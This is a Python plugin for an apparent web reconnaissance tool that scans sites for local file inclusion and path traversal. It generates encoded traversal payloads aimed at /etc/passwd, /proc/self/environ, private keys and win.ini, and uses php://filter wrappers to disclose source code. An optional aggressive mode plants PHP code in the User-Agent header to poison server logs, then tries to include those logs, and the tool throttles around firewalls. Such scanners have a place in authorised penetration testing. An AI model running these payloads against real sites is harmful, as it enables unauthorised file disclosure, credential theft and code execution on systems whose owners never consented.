# recon_tool/plugins/lfi_scanner.py
"""
lfi_scanner.py
---------------

Improved Local File Inclusion (LFI) / Path Traversal scanner.

Key features:
- Uses web discoveries: web/paths.json (required), web/param_seeds.json (optional),
  web/forms.json (optional) from DirBruteForcer.
- Tests GET parameters and discovered POST forms for traversal/LFI.
- Payload families: raw, URL/double-encoded, dot-flooded, Windows/*nix targets,
  null-byte suffix attempts, PHP stream wrappers (php://filter) with auto base64 decode check.
- Optional aggressive log poisoning (requires --lfi-aggressive), tries common access log paths.
- WAF-aware throttling; per-request timeouts; structured attempt & finding logs.

Outputs in the session directory:
- lfi_findings.json   (list of confirmed hits with evidence)
- lfi_attempts.json   (every attempt with outcome and notes)
"""

from __future__ import annotations

import asyncio
import base64
import json
import random
import re
import time
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Iterable, Union
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import aiohttp

from recon_tool.core import BasePlugin, ScanContext


# ---------------------------
# Data models
# ---------------------------

@dataclass
class LFIAttempt:
    url: str
    method: str                 # GET or POST
    parameter: str
    payload: str
    success: bool
    notes: str = ""


@dataclass
class LFIFinding:
    url: str
    method: str                 # GET or POST
    parameter: str
    payload: str
    vulnerable: bool
    evidence: str               # short snippet that proves inclusion
    details: Optional[Dict[str, Any]] = None


# ---------------------------
# Plugin
# ---------------------------

class LFIScannerPlugin(BasePlugin):
    name = "LFIScanner"
    description = "Detect local file inclusion and path traversal vulnerabilities"
    priority = 35

    # Heuristic regexes for evidence
    PASSWD_RE = re.compile(r"(^|\n)root:.*:0:0:.*:(/bin/(ba)?sh|/sbin/nologin)", re.I)
    HOSTS_RE  = re.compile(r"(^|\n)127\.0\.0\.1\s+localhost\b", re.I)
    WININI_RE = re.compile(r"(\[fonts\]|\bfor 16-bit app support\b)", re.I)
    SSHKEY_RE = re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----", re.I)
    ENV_RE    = re.compile(r"(^|\n)(PATH|HOME|USER|HTTP_USER_AGENT|QUERY_STRING)=", re.I)
    CMDLINE_RE= re.compile(r"(^|\n)/usr/(s)?bin/.*", re.I)
    PHP_TAG_RE= re.compile(r"<\?php", re.I)

    # Param name heuristics (file-ish, template-ish, view-ish)
    SUSPECT_PARAMS = [
        "file", "filename", "filepath", "file_path", "path", "dir", "directory", "folder",
        "include", "inc", "require", "req", "resource", "src",
        "page", "view", "template", "tpl", "layout", "theme", "skin",
        "module", "mod", "component", "com",
        "document", "doc", "content",
        "download", "export",
        "site", "locate", "show", "action",
        "cat", "type", "board", "prefix", "detail", "date", "conf",
        "lang", "language", "locale",
    ]
    SUSPECT_NAME_RE = re.compile(
        r"(file|path|dir|include|inc|tpl|template|page|view|module|theme|layout|filename|source|template_name)",
        re.I,
    )

    def __init__(self, context: ScanContext) -> None:
        super().__init__(context)
        self.concurrency = 12
        self.timeout = 10
        self.rate = float(self.context.additional_options.get("rate", 5))
        self.aggressive = bool(self.context.additional_options.get("lfi_aggressive"))

        # Accumulators
        self.findings: List[LFIFinding] = []
        self.attempts: List[LFIAttempt] = []

        # WAF detection counters
        self._waf_block_count: int = 0
        self._waf_total_requests: int = 0
        self._waf_threshold: float = 0.12

        # Cached poisoning marker
        self._poison_marker: Optional[str] = None

        # Build payload banks once (depth 6 by default)
        self.unix_targets, self.win_targets = self._build_target_files()
        self.payloads = self._build_payloads(self.unix_targets, self.win_targets)
        self.wrapper_payloads = self._build_wrapper_payloads()

        # Common log file paths (used when aggressive)
        self.log_targets = [
            # Linux / Apache / Nginx common logs
            "../../../../../var/log/nginx/access.log",
            "../../../../../var/log/apache2/access.log",
            "../../../../../var/log/httpd/access_log",
            "../../../../../var/log/apache/access.log",
            # App logs sometimes reachable
            "../../../../../var/log/syslog",
            "../../../../../var/log/auth.log",
        ]

    # ---------------------------
    # Payload construction
    # ---------------------------

    def _build_target_files(self) -> Tuple[List[str], List[str]]:
        unix = [
            "/etc/passwd", "/etc/hosts", "/etc/issue",
            "/proc/self/environ", "/proc/self/cmdline",
            "/proc/self/fd/1",
        ]
        win = [
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]
        return unix, win

    def _enc_variants(self, path: str, max_depth: int = 6) -> List[str]:
        """Generate traversal variants for a given sensitive path."""
        ups = ["../", "..%2f", "%2e%2e/", "%2e%2e%2f", "..%252f", "%252e%252e%252f", "....//"]
        variants: List[str] = []
        for depth in range(1, max_depth + 1):
            prefix = "".join(random.choice(ups) for _ in range(depth))
            variants.append(prefix + path.lstrip("/"))
        # Stable snapshot so we don't extend while iterating
        base = list(variants)
        # Null byte terminated variants (legacy PHP; still worth a try)
        variants.extend([v + "%00" for v in base])
        variants.extend([v + "%00.jpg" for v in base])
        return variants

    def _build_payloads(self, unix_targets: List[str], win_targets: List[str]) -> List[str]:
        payloads: List[str] = []
        for t in unix_targets:
            payloads.extend(self._enc_variants(t, 6))
        for t in win_targets:
            # Backslashes often normalized; add ../-style too
            payloads.extend(self._enc_variants(t.replace("\\", "/",), 6))
            payloads.append(t)  # raw absolute
        # Dot-flooded and weird separators for bypass attempts
        payloads.extend([
            "....//....//etc/passwd",
            "..;/..;/..;/..;/etc/passwd",
            "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
        ])
        return list(dict.fromkeys(payloads))  # de-dup, preserve order

    def _build_wrapper_payloads(self) -> List[str]:
        # php://filter base64 encode of common script names or param-specified paths.
        # We'll substitute the resource in _test_once when we know the context.
        return [
            "php://filter/convert.base64-encode/resource={RESOURCE}",  # decode to read source
            "php://filter/convert.base64-encode/resource=/etc/passwd",  # quick win on some setups
        ]

    # ---------------------------
    # Orchestration
    # ---------------------------

    async def scan_target(self, target: str, out_dir: Path) -> None:
        web_dir = out_dir / "web"
        paths_file = web_dir / "paths.json"
        if not paths_file.exists():
            return

        # Adjust concurrency if WAF previously detected by any module
        if self.context.additional_options.get("waf_detected"):
            self.concurrency = max(6, self.concurrency // 2)

        # Load discovered pages
        try:
            with open(paths_file, "r", encoding="utf-8") as f:
                raw_paths = json.load(f)
            # Normalize: expect a list of dicts with "url"
            paths: List[Dict[str, Any]] = []
            if isinstance(raw_paths, list):
                for item in raw_paths:
                    if isinstance(item, dict) and item.get("url"):
                        paths.append(item)
            # else: ignore unexpected shapes
        except Exception:
            return
        if not paths:
            return

        # Optional seeds from DirBruteForcer (param names) and forms.json
        seeds_params: Union[Dict[str, List[str]], List[str]] = {}
        forms: List[Dict[str, Any]] = []
        seeds_file = web_dir / "param_seeds.json"
        forms_file = web_dir / "forms.json"

        if seeds_file.exists():
            try:
                loaded = json.loads(seeds_file.read_text(encoding="utf-8"))
                # Accept dict (url -> [param,...]) or list ([param,...])
                if isinstance(loaded, dict):
                    # ensure values are lists of strings
                    cleaned: Dict[str, List[str]] = {}
                    for k, v in loaded.items():
                        if isinstance(v, list):
                            cleaned[k] = [str(x) for x in v]
                    seeds_params = cleaned
                elif isinstance(loaded, list):
                    seeds_params = [str(x) for x in loaded]
            except Exception:
                seeds_params = {}

        if forms_file.exists():
            try:
                loaded = json.loads(forms_file.read_text(encoding="utf-8"))
                # Accept:
                #  - list of form dicts
                #  - dict with "forms": [...]
                #  - dict of url -> [forms...]
                if isinstance(loaded, list):
                    forms = [x for x in loaded if isinstance(x, dict)]
                elif isinstance(loaded, dict):
                    if isinstance(loaded.get("forms"), list):
                        forms = [x for x in loaded["forms"] if isinstance(x, dict)]
                    else:
                        # url -> list-of-forms
                        collected: List[Dict[str, Any]] = []
                        for v in loaded.values():
                            if isinstance(v, list):
                                for it in v:
                                    if isinstance(it, dict):
                                        collected.append(it)
                        forms = collected
                else:
                    forms = []
            except Exception:
                forms = []

        sem = asyncio.Semaphore(self.concurrency)
        async with aiohttp.ClientSession() as session:
            tasks: List[asyncio.Task] = []

            # (A) GET parameter tests: only test suspicious names
            for entry in paths:
                url = entry.get("url")
                if not url:
                    continue
                parsed = urlparse(url)
                params = dict(parse_qsl(parsed.query))
                if params:
                    for name in list(params.keys()):
                        if self._is_suspect_param(name):
                            tasks.extend(self._build_get_tasks(url, name, session, sem, parsed.path))
                else:
                    # No params: if we have seeds, try them
                    seed_names: List[str] = []
                    if isinstance(seeds_params, dict):
                        seed_names = seeds_params.get(url, [])
                    elif isinstance(seeds_params, list):
                        seed_names = seeds_params
                    for name in seed_names[:8]:
                        if self._is_suspect_param(name):
                            tasks.extend(self._build_get_tasks(url, name, session, sem, parsed.path, synth=True))

            # (B) POST form tests: test suspicious inputs
            for f in forms[:150]:  # safety cap
                norm = self._normalize_form_entry(f)
                if not norm:
                    continue
                action, method, inputs = norm
                if not action or method != "POST" or not inputs:
                    continue
                suspects = [k for k in inputs.keys() if self._is_suspect_param(k)]
                if not suspects:
                    continue
                tasks.extend(self._build_post_tasks(action, inputs, suspects, session, sem))

            # Execute
            if tasks:
                await asyncio.gather(*tasks)

        # Persist results
        if self.findings:
            with open(out_dir / "lfi_findings.json", "w", encoding="utf-8") as f:
                json.dump([asdict(r) for r in self.findings], f, indent=2)
        if self.attempts:
            with open(out_dir / "lfi_attempts.json", "w", encoding="utf-8") as f:
                json.dump([asdict(a) for a in self.attempts], f, indent=2)

        # WAF heuristic
        if self._waf_total_requests > 0 and (self._waf_block_count / self._waf_total_requests) >= self._waf_threshold:
            self.context.additional_options["waf_detected"] = True
            self.log(
                f"Potential WAF detected during LFI tests ({self._waf_block_count}/{self._waf_total_requests} blocked)",
                out_dir,
                level="WARN",
            )

        # Summary
        self.log(
            f"LFI tests completed on {target}: {len(self.findings)} findings, {len(self.attempts)} attempts",
            out_dir,
            level="INFO",
        )

    # ---------------------------
    # Normalizers
    # ---------------------------

    def _normalize_inputs_like(self, obj: Any) -> Dict[str, str]:
        """
        Accepts either:
          - dict of {name: value}
          - list of strings (names)
          - list of dicts with fields like {"name": "...", "value": "..."} or {"id": "..."}
        Returns a dict of {name: value_str}.
        """
        out: Dict[str, str] = {}
        if isinstance(obj, dict):
            for k, v in obj.items():
                k_str = str(k)
                v_str = "" if v is None else str(v)
                out[k_str] = v_str
        elif isinstance(obj, list):
            for item in obj:
                if isinstance(item, str):
                    out[item] = out.get(item, "1")
                elif isinstance(item, dict):
                    name = item.get("name") or item.get("id") or item.get("param") or item.get("field")
                    if name:
                        val = item.get("value") or item.get("default") or ""
                        out[str(name)] = str(val)
        # else: unknown = {}
        return out

    def _normalize_form_entry(self, f: Dict[str, Any]) -> Optional[Tuple[str, str, Dict[str, str]]]:
        """
        Normalize a single form record into (action_url, method, inputs_dict).
        Recognizes keys:
          - action / url
          - method
          - inputs / fields / params  (dict OR list)
        """
        if not isinstance(f, dict):
            return None
        action = f.get("action") or f.get("url") or ""
        method = (f.get("method") or "GET").upper()
        inputs_like = f.get("inputs")
        if inputs_like is None:
            inputs_like = f.get("fields")
        if inputs_like is None:
            inputs_like = f.get("params")
        inputs = self._normalize_inputs_like(inputs_like or {})
        return (action, method, inputs)

    # ---------------------------
    # Task builders
    # ---------------------------

    def _is_suspect_param(self, name: str) -> bool:
        n = name.lower()
        return (n in self.SUSPECT_PARAMS) or bool(self.SUSPECT_NAME_RE.search(n))

    def _build_get_tasks(
        self,
        url: str,
        param: str,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        path_hint: str,
        synth: bool = False,
    ) -> List[asyncio.Task]:
        tasks: List[asyncio.Task] = []
        # Traversal payloads
        for p in self.payloads[:40]:  # hard cap per param
            tasks.append(asyncio.create_task(self._test_get(url, param, p, session, sem)))
        # PHP wrappers (try source disclosure)
        for wp in self.wrapper_payloads[:2]:
            resource = path_hint or "index.php"
            if not resource.endswith(".php"):
                resource = "index.php"
            tasks.append(asyncio.create_task(self._test_get(url, param, wp.replace("{RESOURCE}", resource), session, sem)))
        # Aggressive log poisoning passes (subset, only when enabled)
        if self.aggressive:
            tasks.extend(self._build_log_poison_tasks(url, param, session, sem))
        return tasks

    def _build_post_tasks(
        self,
        action_url: str,
        inputs: Dict[str, str],
        suspects: List[str],
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
    ) -> List[asyncio.Task]:
        tasks: List[asyncio.Task] = []
        # For each suspicious input, send traversal and wrapper payloads while keeping others benign
        for name in suspects:
            for p in self.payloads[:30]:
                tasks.append(asyncio.create_task(self._test_post(action_url, name, p, inputs, session, sem)))
            for wp in self.wrapper_payloads[:2]:
                res = "index.php"
                tasks.append(asyncio.create_task(self._test_post(action_url, name, wp.replace("{RESOURCE}", res), inputs, session, sem)))
            if self.aggressive:
                tasks.extend(self._build_log_poison_tasks(action_url, name, session, sem, method="POST", post_inputs=inputs))
        return tasks

    def _build_log_poison_tasks(
        self,
        url: str,
        param: str,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        method: str = "GET",
        post_inputs: Optional[Dict[str, str]] = None,
    ) -> List[asyncio.Task]:
        tasks: List[asyncio.Task] = []
        # Step 1: ensure a unique marker is logged once
        if not self._poison_marker:
            self._poison_marker = f"LFIPOISON{int(time.time()*1000)}"
            # try to get it logged via benign request with PHP code in UA
            headers = {"User-Agent": f"<?php echo '{self._poison_marker}'; ?>"}
            tasks.append(asyncio.create_task(self._poison_request(url, session, headers)))
        # Step 2: attempt to include common logs
        for logp in self.log_targets[:6]:
            tasks.append(asyncio.create_task(
                self._test_once(url, method, param, logp, session, sem, extra_headers=None, post_inputs=post_inputs)
            ))
        return tasks

    # ---------------------------
    # Single attempt helpers
    # ---------------------------

    async def _poison_request(self, url: str, session: aiohttp.ClientSession, headers: Dict[str, str]) -> None:
        try:
            await session.get(url, headers=headers, timeout=5)
        except Exception:
            pass

    async def _ratelimit(self) -> None:
        # Simple global rate pacing for HTTP
        if self.rate and self.rate > 0:
            await asyncio.sleep(1.0 / float(self.rate))

    async def _test_get(
        self,
        url: str,
        param: str,
        payload: str,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
    ) -> None:
        await self._test_once(url, "GET", param, payload, session, sem)

    async def _test_post(
        self,
        url: str,
        param: str,
        payload: str,
        inputs: Dict[str, str],
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
    ) -> None:
        await self._test_once(url, "POST", param, payload, session, sem, post_inputs=inputs)

    async def _test_once(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        session: aiohttp.ClientSession,
        sem: asyncio.Semaphore,
        extra_headers: Optional[Dict[str, str]] = None,
        post_inputs: Optional[Dict[str, str]] = None,
    ) -> None:
        async with sem:
            await self._ratelimit()
            parsed = urlparse(url)
            headers = dict(extra_headers or {})
            success = False
            note = ""
            test_url = url

            try:
                # Build request
                if method == "GET":
                    qs = dict(parse_qsl(parsed.query))
                    qs[param] = payload
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(qs, doseq=True), parsed.fragment))
                    async with session.get(test_url, headers=headers, allow_redirects=True, timeout=self.timeout) as resp:
                        text = await resp.text(errors="ignore")
                        success, note = self._evaluate_response(text, payload)
                else:
                    # POST
                    data = dict(post_inputs or {})
                    data[param] = payload
                    async with session.post(url, data=data, headers=headers, allow_redirects=True, timeout=self.timeout) as resp:
                        text = await resp.text(errors="ignore")
                        success, note = self._evaluate_response(text, payload)

                # WAF counters
                self._waf_total_requests += 1
                if re.search(r"\b(forbidden|access denied|blocked)\b", note, re.I):
                    self._waf_block_count += 1

                self.attempts.append(LFIAttempt(
                    url=test_url if method == "GET" else url,
                    method=method,
                    parameter=param,
                    payload=payload,
                    success=bool(success),
                    notes=note,
                ))

                if success:
                    self.findings.append(LFIFinding(
                        url=test_url if method == "GET" else url,
                        method=method,
                        parameter=param,
                        payload=payload,
                        vulnerable=True,
                        evidence=note[:160],
                    ))

            except Exception as e:
                self.attempts.append(LFIAttempt(
                    url=test_url if method == "GET" else url,
                    method=method,
                    parameter=param,
                    payload=payload,
                    success=False,
                    notes=f"exception: {e}",
                ))
                return

    # ---------------------------
    # Evidence evaluation
    # ---------------------------

    def _evaluate_response(self, text: str, payload: str) -> Tuple[bool, str]:
        """Return (success, evidence/notes). Includes special handling for php://filter base64."""
        # Fast WAF-ish signal (just to count): explicit access denied / forbidden
        if re.search(r"\b(access\s+denied|forbidden|blocked)\b", text, re.I):
            return False, "Possible WAF/deny page detected"

        # Direct markers
        if self.PASSWD_RE.search(text):
            return True, "Found /etc/passwd markers"
        if self.HOSTS_RE.search(text):
            return True, "Found /etc/hosts markers"
        if self.WININI_RE.search(text):
            return True, "Found Windows win.ini markers"
        if self.SSHKEY_RE.search(text):
            return True, "Found private key header"
        if self.ENV_RE.search(text):
            return True, "Found /proc/self/environ style variables"
        if self.CMDLINE_RE.search(text):
            return True, "Found /proc/self/cmdline markers"

        # Log poisoning: detect unique marker
        marker = self._poison_marker or self.context.additional_options.get("_lfi_poison_marker")
        if marker and marker in text:
            # Clear the stored marker so we don't duplicate
            self._poison_marker = None
            self.context.additional_options.pop("_lfi_poison_marker", None)
            return True, f"Log poisoning successful (marker {marker} present)"

        # PHP wrapper base64 decode check
        if payload.lower().startswith("php://filter/convert.base64-encode"):
            # Extract long-ish base64 blob
            m = re.search(r"([A-Za-z0-9+/=\s]{120,})", text)
            if m:
                b = re.sub(r"\s+", "", m.group(1))
                try:
                    decoded = base64.b64decode(b, validate=False).decode("utf-8", errors="ignore")
                    if self.PHP_TAG_RE.search(decoded) or self.PASSWD_RE.search(decoded) or "database" in decoded.lower():
                        return True, "php://filter base64 decoded reveals source / sensitive content"
                except Exception:
                    pass
            # If no blob found, still record as attempted
            return False, "php://filter used, no decodable blob found"

        return False, ""
